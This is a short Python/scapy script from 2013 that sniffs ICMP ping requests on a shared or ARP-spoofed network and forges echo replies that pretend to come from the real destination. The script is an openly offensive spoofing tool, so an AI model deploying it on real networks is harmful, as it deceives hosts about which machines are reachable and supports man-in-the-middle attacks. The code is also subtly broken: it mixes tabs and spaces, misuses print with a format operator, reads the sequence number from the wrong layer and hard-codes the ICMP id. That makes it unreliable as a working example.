#by Sphaz (cyberphaz at gmail.com) 2013
#
#When in a shared network or ARP spoofing, this tidbit will reply to ALL
#ICMP PING requests as though it came from the destination
#
#Note: this does not cover the whohas ARP requests to beat destination unknowns, you gotta fix that yourself

from scapy.all import sniff, IP, ICMP,send

print("Sniffing")
while True:
  s=sniff(filter='icmp', count=1)
	req = s[0]
	 
	req_string= str(s)
	#print req_string
	#lets make sure its ICMP ping
	if (req_string.find("proto=icmp" ) > -1) & (req_string.find("type=echo-request") > -1):
		#we pretend to be the recipient ;)
		print("Crafting ICMP PING reply")
		ip2= IP()
		ip2.dst=req.payload.src
		ip2.src=req.payload.dst

		icmp=ICMP()
		icmp.type=0
		icmp.id=1
		icmp.seq=req.payload.seq
		print("Replying for ICMP PING for %s to %s") % (ip2.dst, ip2.src)
		send(ip2/icmp)
